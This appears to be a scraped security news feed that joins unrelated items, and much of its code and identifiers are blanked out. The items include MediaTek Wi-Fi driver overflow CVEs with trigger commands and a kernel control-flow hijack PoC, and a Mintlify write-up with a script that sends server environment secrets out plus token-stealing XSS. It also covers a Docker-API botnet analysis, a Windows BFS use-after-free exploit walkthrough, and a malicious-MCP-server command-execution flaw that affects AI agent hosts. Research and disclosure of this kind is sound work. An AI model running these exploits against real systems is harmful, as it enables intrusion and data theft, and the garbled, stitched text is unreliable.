The root cause of the vulnerability is improper bounds checking of the attacker-controlled  value passed from userspace; rather than checking that the value does not exceed the size of the destination  field and exiting early if it does, the code does the  and checks that the incoming size if not  the destination field size, essentially forcing an overflow condition to occur. The overflow happens on the call to  and writes to . This is likely the result of a typo (using  when  was intended).The included PoC demonstrates the ability to corrupt the instruction pointer with an arbitrary address by chaining this bug with an info leak in the  subcommand handler.CVE-2025-20713: Stack Overflow in Set_BeaconReq_Proc Parsing of channel report list: MT7622 v5.0.5.4: Netgear WAX206 (confirmed)The function  in the  driver is vulnerable to a stack buffer overflow when handling the data passed in via the call to  which triggers the handler. Specifically, the issue is found in the code block that handles parsing of the “channel report list” command parameter field in the incoming command string. The issue occurs due to an unbounded  loop which uses a counter to index and write into a stack allocated buffer based on presence of the separate character  in the argument field. The values written to this buffer are 1-byte numeric values parsed using  from the attacker-controlled input.On a system where the kernel driver is installed, run the following  command to issue the IOCTL for the vulnerable code path via the  subcommand for  key value.python3 
iwpriv ra0 CVE-2025-20714: Stack Overflow in Set_BeaconReq_Proc Parsing of regulatory class parameterMediaTek assigned a CVE for this bug, but still claimed the bug was a duplicate because the overflow happens in the same function as the other two issues in this function (CVE-2025-20715, CVE-2025-20713). That’s it – that’s the only reason they used to argue it was a duplicate.: MT7622 v5.0.5.4: Netgear WAX206 (confirmed)The function  in the  driver is vulnerable to a stack buffer overflow when handling the data passed in via the call to  which triggers the handler. Specifically, the issue is found in the code block that handles parsing of the “regulatory class” command parameter field in the incoming command string (parameter index 7). The issue occurs due to an unbounded  loop which uses a counter to index and write into a buffer at RRM_MLME_BCN_REQ_INFO req_struct.reg_class[16] (stack allocated) based on presence of the separate character  in the argument field. The values written to this buffer are 1-byte numeric values parsed using  from the attacker-controlled input.On a system where the kernel driver is installed, run the following commands to create the payload buffer and issue the IOCTL for the vulnerable code path via the  subcommand for the  key value.python3

iwpriv ra0 CVE-2025-20717: Stack Overflow in Set_Igmp_Flooding_CIDR_Proc: MT7622 v5.0.5.4: Netgear WAX206 (confirmed):  flagThe vulnerability occurs due to a lack of bounds checking when performing a copy operation of user-controlled data into a statically-sized buffer. This happens in the function Set_Igmp_Flooding_CIDR_Proc() when the contents of  (which contains the argument passed as the value of  in the  command) is copied to the local buffer  using . The copy operation uses the length of the string in  as it’s size argument without checking to ensure the string length does not exceed the size of the  buffer. Any argument with a length greater than 25 will result in a stack buffer overflow.On a system where the kernel driver is installed, run the following commands to create a payload buffer and run  to issue the IOCTL for the vulnerable code path via the  subcommand for  key value.python3

I explained myself multiple times but they were “unable” to comprehend that creating the unprivileged user wasn’t something attacker would need to do.: MT7622 driver v5.0.5.4, v5.1.0.0, MT7629 v6.0.3.0, MT7915 v7.4.0.0: Netgear WAX206 (confirmed):  flagThe vulnerability occurs in the function  when handling the case for OID OID_802_11_OCE_REDUCED_NEIGHBOR_REPORT (0x969) subcommand. The issue is caused by the use of the attacker-controlled value  in the call to  without performing an upper bounds check to ensure the size of the data will not overflow the destination buffer. In this case, the destination is the  structure which has a size of (512 + 4 + 4) = . Therefore, size values greater than 520 bytes will result in kernel stack corruption.Vulnerable systems must have the  driver configuration flag set to 1.Execute the PoC on the target system running a vulnerable driver to trigger a kernel crash:

CVE-2025-20733: Heap Overflow in RT_OID_WSC_SET_CON_WPS_STOP Handler: MT7622 v5.1.0.0, MT7629 v6.0.3.0, MT7981 driver v7.6.7.2: Netgear WAX206 (confirmed), SpaceX Starlink Wifi Gen2The vulnerability occurs in the function  when handling the OID for RT_OID_WSC_SET_CON_WPS_STOP (0x764).  Within the body of the switch-case that handles this OID, an allocation is made of sizeof(WSC_UPNP_CTRL_WSC_BAND_STOP) and saved to the pointer . Assuming the allocation succeeds, a block is entered where  is called to copy data from userspace and write it to the memory allocated to , using  as the size argument for the copy operation.No upper bounds check is performed on the value in , which is attacker-controlled, prior to it’s use in the call to , leading to a heap buffer overflow if an attacker provides a  value that is greater than sizeof(WSC_UPNP_CTRL_WSC_BAND_STOP) (which evaluates to 12 bytes).Execute the PoC with a large bufsize argument:CVE-2025-20734: Heap Overflow in Set_SecWPAPSK_Proc: MT7622 v5.1.0.0, MT7629 v6.0.3.0, MT7981 driver v7.6.7.2: Netgear WAX206 (confirmed), SpaceX Starlink Wifi Gen2:  and  must be enabled in the build configuration.The vulnerability occurs in the function  when processing an attacker-controlled argument string. The function first checks if the length of the argument string is less than 65. If so, it enters a block where the key data is set. However, if the length exceeds 65, the function does not treat this as an error and continues execution.If the  build flag was enabled, the vulnerable code block is included in the function and is reached after the check above. Within this block:The length of the attacker-controlled argument string is calculated using The length value is used as the length argument in a call to  to write to No bounds checking is performed on the length of the argument string before this copy operation. Since  is statically sized at 64 bytes, any argument string longer than 64 bytes will overflow the buffer. Additionally, because  is used for the copy operation, there are no restrictions on the payload data, allowing the attacker to include null bytes or other arbitrary data in the overflow.Execute the commands below on a system running the vulnerable driver to trigger the bug.iwpriv ra0 python3

CVE-2025-20735: Heap Overflow in mtk_send_offchannel_action_frame: MT7622 v5.1.0.0: Driver must be built with  configuration option (this should also enable the CHANNEL_SWITCH_MONITOR_CONFIG flag)The vulnerability occurs in the function mtk_send_offchannel_action_frame(). The function allocates a fixed-size heap buffer  of 2304 bytes using the  macro. However, the function subsequently calls  to copy attacker-controlled data into this buffer without validating the size of the data.The size of the data to be copied is determined by the  field, which is passed from userspace via the IOCTL handler. If an attacker specifies a value larger than 2304 bytes, the  operation in  will write beyond the bounds of the allocated buffer, resulting in a heap buffer overflow.Compile and execute the PoC like this:CVE-2025-20736: Stack Overflows in Set_IgmpSn_AddEntry_Proc and Set_IgmpSn_DelEntry_ProcThis was another fun one. This pair of Add/Delete functions both contain basically the same bug which results in a buffer overflow. MediaTek argued that one of these was a duplicate by their definition because, and I kid you not, the two bugs occur in the same .: MT7622 v5.1.0.0:  enabledThe vulnerability occurs in the function Set_IgmpSn_DelEntry_Proc() when handling parsing of an IP address value from the argument string passed in from userspace. In this block, a  loop is used together with calls to  using the  character as a separator to parse the individual octets of the IP address string. Within this loop, there is no bounds checking done on the  iterator variable to ensure it does not exceed the size of the  buffer prior to using the  variable to index into the  buffer when writing the parsed numeric value from the argument token using . This results in an OOB write condition that can be used to corrupt the kernel stack if a string with more than 4 “.” characters is found.The vulnerability can be triggered using the following payload, which sends an overlong sequence formatted reach the bug.
iwpriv ra0 python3 The vulnerability occurs in the function Set_IgmpSn_AddEntry_Proc() when handling parsing of an IP address value from the argument string passed in from userspace. The vulnerable logic for this function is identical to that shown in Set_IgmpSn_DelEntry_Proc() above.The vulnerability can be triggered using the following payload, which sends an overlong sequence formatted reach the bug.
iwpriv ra0 python3 CVE-2025-20737: Stack Overflow + Info Leak in OID_802_11_PASSPHRASES Handler: MT7622 v5.1.0.0The vulnerability occurs in the handler for  (0x0536). The code creates a fixed-size stack structure  and then uses  to copy data from user space into this structure without validating that the incoming data size matches the structure size. The size of the structure is 68 bytes, meaning any length value greater than 68 will result in kernel stack corruption. Additionally, the code goes on to use whatever value is in the struct member  to print that many bytes from the contents of the  buffer without any bounds checking, resulting in disclosure of kernel memory to userspace in the kernel message buffer (dmesg).Execute the PoC below with the following parameters:CVE-2025-20738: Stack Overflow in Set_ApScan_Proc: MT7622 v5.1.0.0, MT7629 v6.0.3.0The  function contains a  loop that reads characters from the input argument string and writes them to a fixed-size stack buffer . The loop continues until it encounters a NULL byte in the input string. The issue is that there’s no check to ensure that the index  used to access the  array remains within bounds (0-32). If the input string is longer than 33 bytes and doesn’t contain a colon () or NULL byte within the first 33 characters, the loop will write beyond the bounds of the  array, causing a stack buffer overflow.Execute the command below on a system running the vulnerable driver to trigger the bug.iwpriv ra0 python3 CVE-2025-20739: Stack Overflow in Set_IgmpSn_BlackList_Proc: MT7622 v5.1.0.0:
    Configuration: IGMP Snooping enabled, IGMP TV mode enabledRequired features/build flags: , , CONFIG_VENDOR_FEATURE10_SUPPORTThe vulnerability occurs in the function Set_IgmpSn_BlackList_Proc() when copying the argument string in  to the fixed-size char buffer  using . The size argument given for the copy operation is calculated by measuring the length of the string in  (the source buffer) without any upper-bounds check to ensure the length of the argument string does not exceed the size of the destination buffer. An argument string which contains more than 100 characters will result in a buffer overflow of the  buffer.Execute the command below on a system running the vulnerable driver to trigger the bug.iwpriv ra0 python3 CVE-2025-20741: Heap Overflow in vie_oper_proc: MT7622 v5.1.0.0: Netgear WAX206 (confirmed)The function  in the  driver is vulnerable to a heap buffer overflow when handling the incoming command string passed in via the  handler and  interface. The overflow happens due to a lack of length restrictions on the parsing of a string token using  on the incoming string. This value is parsed and written to a heap allocated buffer, which can result in a heap buffer overflow if the length of the token exceeds the size of the allocated buffer. In this case, the size of the allocated buffer is calculated with the expression sizeof((MAX_VENDOR_IE_LEN + 1) * 2), which incorrectly calculates the size of the result of the arithmetic expression rather than using the result of the expression (as appears to be the intent). In effect, the allocation will always be for  bytes (4).On a system where the kernel driver is installed, run the following  command to issue the IOCTL for the vulnerable code path via the  command for the  key.iwpriv ra0 1-frm_map:1-oui:00bbaa-length:1194-ctnt:python3 CVE-2025-20748: Kernel Code Execution via OOB Write in SetRxvRecordEn: MT7622 v5.1.0.0: Netgear WAX206 (confirmed)The vulnerability occurs in the function , which is the handler for the  subcommand. Within this function, an attacker-controlled argument string is parsed using the insecure string function  without a length limit or upper bounds check on the length of the argument string. This results in a buffer overflow of the  buffer, contained within the device object for the underlying network interface. As there is no upper bounds on the write size, it’s possible to corrupt almost the entirety of the  object and beyond.PoC: Corrupt Kernel MemoryTo trigger the vulnerability and corrupt memory:iwpriv ra0 1-1-0-1-5-1-5-5-python After running the command, perform an operation that will result in the sending of a notification to enrolled notify handlers. An easy way to do this is to trigger a ‘link down’ operation on the interface via . Another option is to use the iwpriv ra0 set SSID=<anything>, which re-inits the interface and will trigger a notify call. A crash should occur in the function  upon access to a corrupted portion of the WifiSysInfo struct in the device struct for the interface.The PoC leverages the vulnerabilty to corrupt the adjacent  object to hijack execution flow in the kernel. This object contains linked lists pointing to  objects, which each contain a function pointer at notify_entry.notify_caller, so corrupting the pointers in the linked list can be used to point to a fake  object and use that to hijack execution flow when the embedded callback function is executed. The PoC makes use of a kernel info leak available through the iwpriv  subcommand handler to determine the address of memory containing controlled data in the kernel and writes a forged object to align with the  structure.Executing the PoC will result in execution being redirected to the address  (tested on the MediaTek MT7622 AX3600-gmac1-WAX206 board, Linux 4.x). The output below shows successful control of the instruction pointer.[ 2750.312397] [PMF]APPMFInit:: apidx=0, MFPC=1, MFPR=0, SHA256=0

CVE-2025-20742: Heap Overflow in FT_R1khEntryInsert: MT7915 v7.4.0.0, MT7629 v6.0.3.0: Netgear WAX206, Starlink Wifi Gen2The vulnerability occurs due to a lack of bounds checking on the attacker-controlled values prior to using one of those values as the size argument to a write operation in . This function is reached via an ioctl to the RT_PRIV command with subcommand/OID , and expects the data sent from userspace to be in the format of a struct FT_KDP_EVT_KEY_ELM object. This object includes another embedded object of type , which has members representing the actual key material being transmitted. These members include a statically sized buffer  and a size value in , with the latter defining the actual size of the data in .After copying the argument data from userspace into a kernel allocated buffer in , this data is passed to  for processing/handling. Some initial parsing is done on the data and then it is cast to type  and some basic validation is done on some values of the struct. The code continues on to call  and passes in pointers to multiple members of the key element struct sent by the client, including the  and  members.In , an allocation is made to hold the data for an object of type  (148 bytes) and the values passed in as arguments to the function are used to initialize the new object. The vulnerability occurs when the  data is copied from the source buffer into a destination buffer using the  sent in the attacker-controlled key element struct without checking that it does not exceed the size of the destination (49 bytes). The  field of the  is of type , meaning that the maximum value it can hold is 255, so this is the max value that can be chosen by an attacker. This results in the ability to overflow the FT_KDP_PMK_KEY_INFO.R0khId[49] buffer by ~200 bytes.The attached PoC can be used to trigger the vulnerability and cause a crash like the one shown in the output below the PoC code. It may require more than a single run to corrupt memory enough to cause a crash but this will usually happen within 3 runs. NOTE: multiple runs will require changing the filler byte argument each run, otherwise the request won’t be seen as a new entry and no action will be taken.It will produce output like this upon crashing:[ 8566.183685] Unable to handle kernel paging request at virtual address 42424242424242

A full LPE exploit using this bug and a couple of others against the WAX206 has been written and will be released along with this post. More details will be given in an upcoming blog post :)That’s it! But more to come soon, including a deep dive into the full-chain exploit for CVE-2025-20742 and a deep dive into a few bugs  included in this post which impact the WPA EAPOL handlers and which are ! I’m also working on cleaning up some code I wrote earlier this year for a QEMU PCI device to emulate the MT7622 (at least enough to load the driver and interact with the ioctl handlers) which was  useful for debugging and reproducing bugs without the limitations on the test device I had access to.

i deployed it to mintlify and went to the page it was on, and i got a request from a vercel/amazon ip! are they really doing this on their nextjs app?i wrote a simple script to exfilitrate some data such as the process.env (and app files) to find out: = () =>
  (, {
    : ,
    : .(data),
  });
({ : [{ : , : .(process.) }] });
 {
  ().( (a) => {
     arr = [];

and, after running it, this is what i got:shit. this is bad, we have full access.i quickly realised that this was the server-side serverless (lol) environment of their main documentation app, while this calls to a external api to do everything, we have the token it calls it with in the env.alongside, we can poison the nextjs cache for everyone , allowing mass xss, defacing, etc on any docs site.we can also pretend nonexistent pages exist in the cache, allowing targeted xss toowith the other keys we could also:poisoned mintlifys analyticsruined mintlifys feature flaggingdos'ed customer sites via path validationstrigger a bunch of pdf exports which would jack up mintlifys cloudconvert billmass xss (on customer domains)targeted xss (on custom domains)targeted xss (CVE-2025-67842)after getting all of the server routes, i noticed a interesting one: /_mintlify/static/[subdomain]/{...path}. this route seemed to allow you to get static images from your repository, such as svgs, pngs, etc.what if i could access my organizations asset from another domain?well i tried, i crafted a url that looked likehttps://discord.com/_mintlify/static/evascoolcompany/xss.svg
which, the svg on my repository having this content:and when i went to the url, i got this:this allows complete 1 click xss on users who click a link. definitely not great, but it makes the fact worse that most companies dont properly scope cookies, or have their documentation on a subpath (such as ).the latter was true in discords case, their documentation was on , and i can just get the  value from localstorage directly, and exfiltrate it using whatever i wantsome other companies that i could do full exploitation on are twitter, vercel and cursor. though we did not check many companies and there is definitely morea few hours after i started looking into this, i got an unexpected, sort of out of nowhere message from a friend, hackermon, who had found the targeted xss independently aswellwe started looking into this together, alongside mdl, who was also looking into it with hackermonalso checkout their blogposts here and here! (respectively)we also got in contact with mintlify, and started disclosing everything we already had and future things directly to themhere comes the patch bypass (CVE-2025-67845)after mintlify patched the targeted xss via static, i was looking at the code for the route and had an ideathe code for the endpoint looked like this (not exact, recreation):() {

The breach caused life-threatening disruptions at 140 hospitals and put the medical records of 5.6 million patients into the hands of the attackers. US Senator Ron Wyden (D-Ore.) in September called on the Federal Trade Commission to investigate Microsoft for “gross cybersecurity negligence,” citing the continued default support for RC4.Last week, Microsoft said it was finally deprecating RC4 and cited its susceptibility to Kerberoasting, the form of attack, known since 2014, that was the root cause of the initial intrusion into Ascension’s network.Fun fact: RC4 was a trade secret until I published the algorithm in the second edition of  in 1995.]]></content:encoded></item><item><title>Fake WhatsApp API Package on npm Steals Messages, Contacts, and Login Tokens</title><link>https://thehackernews.com/2025/12/fake-whatsapp-api-package-on-npm-steals.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivmlgJ1Ik_0R32UVEqmVu8yRjzKyNEMijqN7ox6JMNp9RQFOtpeBhDHEcgQH6eL6SgRRF3z6pH4YHh2fanPXGIIyrMJIUZ72Nm4JOWYycoqFnvzyFcbuufQHdjxdde1_MIZ0SiSsG8EyrzC0KpF-pO4Nvzpg2OtpApM_F0pZizo46YpYmU6Jj0dA1YvHiz/s1600/whatsapp-api.jpg" length="" type=""/><pubDate>Mon, 22 Dec 2025 16:28:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of a new malicious package on the npm repository that works as a fully functional WhatsApp API, but also contains the ability to intercept every message and link the attacker's device to a victim's WhatsApp account.

What started as a quick triage turned into a deep dive-reverse engineering the custom bincode C2 protocol, tracing the attack back to exposed Docker APIs, and finally building a fake bot to infiltrate the botnet itself. That C2 honeypot is now live, monitoring attack targets in real-time and tracking how the malware evolves.0/60+ engines at time of captureUnauthenticated Docker API (TCP/2375)Rust-based DDoS bot with UDP/TCP flood capabilitiesCustom bincode serializationSingle server for distribution (port 80) and C2 (port 8080)HTTP-based binary replacement mechanismCustom C2 honeypot tracking live attack targetsThe Attack Vector: Docker API ExploitationThe first surprise came from analyzing my honeypot logs. The malware wasn’t delivered through SSH brute-forcing or web exploits it exploited unauthenticated Docker APIs exposed on port 2375.This attack pattern targets thousands of misconfigured Docker hosts across the internet. The speed and automation suggest it’s part of a larger scanning botnet.A critical discovery: the C2 server serves dual purposes:From a defensive standpoint, this is encouraging: the architecture is straightforward and brittle, with a single point of failure that makes it trivial to dismantle. 😎Static Analysis: Identifying Rust SignaturesThe binary was stripped (no debug symbols), but at 1.5MB, it clearly contained a modern runtime. Running  confirmed my suspicion: .Key libraries identified in the binary:These libraries revealed the malware’s sophistication:: High-performance async networking: Encoding and decoding custom binary protocol (not JSON/HTTP): Compile-time string obfuscation to hide IoCsFor the reverse engineering phase, I used  with the GhidRust plugin, which significantly improved the decompilation quality by reconstructing Rust-specific structures and types. Without it, analyzing Rust binaries in Ghidra produces nearly unreadable output due to the language’s unique memory management patterns and enum representations.Dynamic Analysis: Catching the C2 LiveI set up a multi-layered sandbox for safe execution: Docker running inside an , providing defense-in-depth against potential container escapes. The malware ran in a hardened container with minimal privileges:Dockerfile of :Execute the container with strict resource limits:The server was live and accepting connections. This was the breakthrough moment.The complete C2 communication follows this sequence:My initial reverse engineering suggested a SHA256 proof-of-work mechanism. The reality was simpler. Here’s the actual 87-byte handshake:Packet type:  (Handshake)Username:  (hardcoded)Nonce: "handshake_" + (timestamp * 10) — a predictable patternTimestamp: Unix timestamp (e.g.,  = )The server responded with a simple  (0x4F4B)—no cryptographic challenge required. Our earlier probes received  (0x4E4F) because we were sending the wrong packet format based on static analysis assumptions.username + nonce + timestampImmediately after the handshake, the server pushed an UPDATE command:The bot downloaded a fresh 1.5MB binary the auto-update mechanism in action.The protocol has several weaknesses that enabled our monitoring:No cryptographic authentication: The predicted SHA256 PoW doesn’t exist: Based on timestamp, easily reproducible:  is the same for all bots: All traffic in cleartext (no TLS)This made impersonating a bot trivial once we understood the real protocol. 🍯 🪤Static vs Dynamic: Lessons LearnedThis analysis reinforced a critical principle:Never trust static analysis alone. Always validate with dynamic execution.Static Analysis PredictedDynamic Analysis RevealedSHA256 proof-of-work (32 bytes)Username + timestamp-based noncevariant (u8) + pow ([u8; 32])Complex struct with length-prefixed stringsASCII “OK” (0x4F4B) / “NO” (0x4E4F)Immediate after successful handshakePredictable: "handshake_" + timestamp*10The  structures I found were likely dead code or planned features never implemented.⚠️ : At the time of capture (10 days ago), this sample had  across 60+ antivirus engines. This highlights why proactive threat hunting and honeypots are essential relying solely on signature-based detection would have missed this threat entirely.Ongoing Monitoring: C2 HoneypotAfter fully decoding the protocol, I developed a custom honeypot that impersonates a bot connecting to the C2 server. This fake bot successfully completes the handshake and receives commands from the attacker’s infrastructure.This approach allows me to passively monitor:: Which IPs/domains are being DDoSed: UDP vs TCP flood, duration, intensity: Command frequency, update cycles: Protocol changes or new attack typesThe monitoring is ongoing, and I’m collecting data on the botnet’s targets. A follow-up post with aggregated findings may come once enough data is gathered.🔍 : By operating a fake bot inside the botnet, we gain visibility into real-world attacks as they happen intelligence that’s impossible to obtain through traditional defensive measures alone.Pro Tips: Honeypot Configuration for Docker API AttacksIf you want to capture similar attacks, configure Beelzebub to simulate a vulnerable Docker API:Or low interaction docker API honeypot configuration by Akamai hunt Github repoThe fact that zero antivirus engines detected this sample when I captured it 10 days ago demonstrates that attackers are winning the evasion game, Rust’s compiled binaries, combined with string obfuscation, effectively bypass traditional signature-based detection!: Zero detection at capture timeRust malware is increasing: Harder to reverse engineer, better performance, lower detection ratesStatic analysis has limits: Always validate with dynamic execution: A custom C2 honeypot now provides real-time visibility into botnet operations 👀The C2 honeypot is actively monitoring attack commands.

You may therefore receive emails claiming they have your personal information. As a reminder, we will never ask for your password or payment information by email.”Pornhub is one of the world’s most visited adult video-sharing websites, allowing users to view content anonymously or create accounts to upload and interact with videos.Pornhub has reported that on November 8, 2025, a security breach at third-party analytics provider Mixpanel exposed “a limited set of analytics events for certain users.” Pornhub stressed that this was not a breach of Pornhub’s own systems, and said that passwords, payment details, and financial information were not exposed. Mixpanel confirmed it experienced a security incident on November 8, 2025, but disputes that the Pornhub data originated from that breach. The company stated there is: “No indication that this data was stolen from Mixpanel during our November 2025 security incident or otherwise.”Regardless of the source, cybercriminals commonly attempt to monetize stolen user data through direct extortion. At the moment, it is unclear how many users are affected, although available information suggests that only Premium members had their data exposed.In October, we reported that one in six mobile users are targeted by sextortion scams. Sextortion is a form of online blackmail where criminals threaten to share a person’s private, nude, or sexually explicit images or videos unless the victim complies with their demands—often for more sexual content, sexual favors, or money.Having your email address included in a dataset of known Pornhub users makes you a likely target for this type of blackmail.How to stay safe from sextortionUnless you used a dedicated throwaway email address to sign up for Pornhub Premium, you should be prepared to receive a sextortion-type email. If one arrives:Any message referencing your Pornhub use, searches, or payment should be treated as an attempt to exploit breached or previously leaked data.Never provide passwords or payment information by email. Pornhub has stated it will not ask for these.Do not respond to blackmail emails. Ignore demands, do not pay, and do not reply—responding confirms your address is actively monitored.Save extortion emails, including headers, content, timestamps, and attachments, but do not open links or files. This information can support reports to your email provider, local law enforcement, or cybercrime units.Change your Pornhub password (if your account is still active) and ensure it’s unique and not reused anywhere else.Review your bank and card statements for unfamiliar charges and report any suspicious transactions at once.If you used a real-name email address for Pornhub, consider moving sensitive subscriptions to a separate, pseudonymous email going forward.Use , our simple scam response framework to help protect against scams. — Don’t let urgency or pressure push you into action.

(@flyingpassword)About 2 years ago, Microsoft first released Win32-App-isolation which is a sandbox-like mechanism to further separate application access to resources on Windows clients. Brokering File System (BFS) was released around the same time to specifically handle file access from these isolated applications. Because this is potentially reachable from inside isolated/sandboxed applications, it is an interesting and fresh targets for privilege escalation.In this post, we will take a deeper look into CVE-2025-29970, a use-after-free vulnerability in , which was previously discovered by HT3Labs. The analysis was done on  version .Brokering File System (BFS) is developed together with the AppContainer feature on Windows, and later on, AppSilo (Win32-Isolated Application). It is a mini-filter driver that is responsible for managing I/O operations that originate from file, pipe and registry operations.There are a few data structures that BFS uses to internally manage access to these resources.BFS uses the  structure to store s in a hash table. The ’s are looked up in various operations that will be explained below. To avoid race conditions, it also utilizes a  member. contains information about the entity that the policy is applicable to, for example:  and . It has an accompanying  that contains specific paths that the User running the AppContainer can or cannot access. Because  is a very common object referred to in a lot of operations, it has a  member. stores information about the paths concerned in its attached . Its internal representation uses a bit map, a linked list called  and an AVL table (a type of self-balancing tree). The choice of these structures is due to the parallel storing of a serialized format of policies on disk and an in-memory format as a binary tree and linked list for fast lookup and manipulation.The  is a linked list that stores the list of files and subdirectories under a directory that concerns the same . Only the list head is stored in the , each entry in the list carries a data buffer (currently for unknown usage) and an offset of that entry in the serialized file format stored on disk.BFS utilizes a few common operations like create, insert, modify, delete, remove on its objects (PolicyEntry, StorageObject, DirectoryBlockList, etc). The following diagram captures the general interactions among some important operations. Note that each node in the diagram is not necessarily a 1:1 correspondence to a function or object in BFS, it is only meant to be for a general understanding of the BFS operations.There are a few noteworthy operations that concern the aforementioned objects: is initialized during  along with other driver initialization is allocated in  if access to a new path is requested.During the initialization of ,  will allocate a new  that attaches to the newly created A Root Directory is associated with a , which will create a  in A  can be added, modified or cleaned up in BfsProcessSetPolicyRequest, and it can be do so via  and , which get passed the  reference obtained from The  along with its  is deallocated in , which is a result from calling the BfsProcessDeletePolicyEntryRequest IOCTLThe naming of  vs.  may be a bit confusing, they perform two different things: will clean up the data of a particular entry on disk, meaning reference to the entry is not deallocated. will deallocate the memory for the entry entirely.CVE-2025-29970 is a use-after-free vulnerability concerning the  object, which is essentially a linked-list. Its vulnerable life-cycle is explained in the following diagrams:When a policy is added via the BfsProcessSetPolicyRequest IOCTL, a  is created, which involves allocating and initializing a  that contains a .When policies are removed via the BfsProcessDeletePolicyEntryRequest,  is deallocated, among with its members. During the deallocation process, its  is cleaned up by iterating through its  and deallocating each entry in the linked-list. The deallocation loop in  is where the use-after-free vulnerability happens. Let’s look closely at its code below to understand:The local loop variable  is assigned the  member from the  being cleaned up. This member, as explained previously, is the  of the linked-list. Each iteration does the following:Retrieve the first entry of the linked-list from  [1]. Note that, the first entry in this context is  the same as the head of the linked-list. More information can be found here about Microsoft’s linked-list.Perform various sanity checks of linked-list integrityUnlink the current node from the linked-listDeallocate the accompanying  of the current node [2], then deallocate the node itself [3].The head of the linked-list is deallocated [4].We can see how this logic is flawed, because a linked-list may, and very often contains more than one entry. This means, the head of the list is deallocated at the end of the first iteration, and it is being dereferenced again at the beginning of the second iteration to clean up subsequent entries. This is obviously a use-after-free scenario.In the patch for this vulnerability, the deallocation loop is separated into another function The vulnerable free has been moved outside the loop [5]. It ensures that the content of the linked-list is totally deallocated before its head is deallocated.This vulnerability is very unlikely to turn into further useful primitives like information leak or arbitrary read/write. This is due to:Limited use of the UAF’d pointer, no write to it, and no read from it into a memory that can be returned to users, only dereferencing.Very tight window from free to use, making it very difficult to reclaim the freed memory and replace it with malicious data.To reach the vulnerable code and trigger the bug, we need to meet a few requirements:The  passed to the IOCTLs must contain a specific token to trigger BFS IOCTLs.There must be  exists in the  by the time of removal request.The  must have a .Step 1: Acquiring the right tokenNot every process is under BFS’ management. Therefore, various IOCTLs in the driver include a check for the right token before proceeding. We need to obtain the token before we can make IOCTL requests by impersonating a suitable process. The method and reason have previously been discussed in HT3’s researchStep 2: Adding Policy Entries to the Policy TableTo successfully call the vulnerable function, we need to have existing policy entries present in the policy table, so the removal function is triggered. Policies can be added in multiple ways, programmatically via IOCTL in the driver, or interactively when Isolated WIn32 applications request file access. In our exploit, we will apply the programmatic method:The input of the IOCTL is a struct that contains information about the requested operation, the path to apply the policy on, the type of the path (file or directory)Note that the  includes a  operation, but this is different from the IOCTL we are targeting in the next step, as explained previously in BFS Operations. This operation disables the  rather than entirely removing it from the , therefore, it does not trigger the deallocation of the .There are some constraints on the path that the  is referring to:The path must exist. Therefore, we need to create the file or directory we are using in the IOCTL.The impersonated token must have access to this path. This seems to be the limit of adding policies programmatically, therefore, we choose the temporary directory of the package we are impersonating here:
C:\Users\​test\​AppData\​Local\Packages\​MicrosoftWindows.​Client.​WebExperience​_cw5n1h2txyewy\​AC\Temp\.
When we create policy entries this way, it conveniently creates a  that is attached to each entry, which satisfies one of the requirements. There are a few other types of policy entries that can be created through various operations like Registry Key, Pipes, but it does not concern this vulnerability, and some of these entries do not have a  attached (like Registry Key).Step 3: Triggering  RemovalThis function is reached via the BfsProcessDeletePolicyRequest IOCTL, and its input is simply the previously impersonated token.The exploit flow can be summarized as follows:Note that, while we’re supposed to get an immediate BSOD when the UAF happens, it does not seem so in practice because the object is small (size 0x20) and the freed memory is not immediately cleaned up, leaving dangling pointers (that are still valid!) that will get the loop going without any access violation. Therefore, we need to repeatedly perform adding and removing policy entries for the freed memory to be reclaimed and the data becomes invalid.From testing with various ILs and with the current methods of acquiring the right token to run the exploit, it seems that the BFS device can only be accessed from a Medium IL process. For that reason, the following combinations did not work:Injecting into Adobe Reader renderer process that run as a Low IL AppContainer: It neither has an  token nor has the privileges to impersonate one.Running the exploit from an AppSilo that run as a Low IL AppContainer: Even though it has an  token, but it fails to get access to the BFS device.
Other than these failed attempts, injecting into a Medium IL process still works.If the steps are performed properly, we will get a BSOD:Even though BFS is a fairly simple and small driver, vulnerabilities like this have constantly made appearance in recent Patch Tuesday. With the increasing efforts in sandboxing applications on Windows, drivers like this remain a promising attack surface and are definitely worth keeping an eye on.]]></content:encoded></item><item><title>Revisiting CVE-2025-50165: A critical flaw in Windows Imaging Component</title><link>https://www.welivesecurity.com/en/eset-research/revisiting-cve-2025-50165-critical-flaw-windows-imaging-component/</link><author></author><category>threatintel</category><pubDate>Mon, 22 Dec 2025 09:55:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[A comprehensive analysis and assessment of a critical severity vulnerability with low likelihood of mass exploitation]]></content:encoded></item><item><title>Ukrainian hacker admits affiliate role in Nefilim ransomware gang</title><link>https://www.bleepingcomputer.com/news/security/ukrainian-hacker-admits-affiliate-role-in-nefilim-ransomware-gang/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Mon, 22 Dec 2025 09:46:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A Ukrainian national pleaded guilty on Friday to conducting Nefilim ransomware attacks that targeted high-revenue businesses across the United States and other countries.

NetSec</source><content:encoded><![CDATA[In late 2025, security researchers disclosed CVE-2025-6514—a critical vulnerability in  that affected 558,846 downloads (HackerNoon). The issue allowed arbitrary OS command execution when connecting to untrusted MCP servers (JFrog advisory).  is used by LLM hosts such as Claude Desktop, Cursor, and Windsurf (JFrog blog).The attack vector exploited a pattern OAuth introduced: dynamic discovery of authorization endpoints (JFrog blog).The bug itself was client-side— failed to sanitize URLs before opening them (JFrog advisory). But the architectural assumption that enabled the attack is OAuth’s: clients should ask servers where to authenticate. That assumption, designed for a world of known identity providers, becomes dangerous when applied to autonomous agents connecting to arbitrary MCP servers.The Model Context Protocol (MCP) has become the standard for connecting AI agents to external tools and services. When an MCP client connects to a remote server, it needs to authenticate. In , that flow asks the server for OAuth metadata (including an ) and then opens the returned URL for the user to authenticate (JFrog blog). The flow looks like:Client asks the MCP server: “Where should I authenticate?”Server responds with OAuth metadata, including an Client opens a browser to that endpointUser logs in, client receives tokensThe vulnerability exploited step 2. A malicious MCP server could return a crafted  URL that, instead of opening a login page, triggered OS command execution when  attempted to open it (JFrog blog; JFrog advisory).The 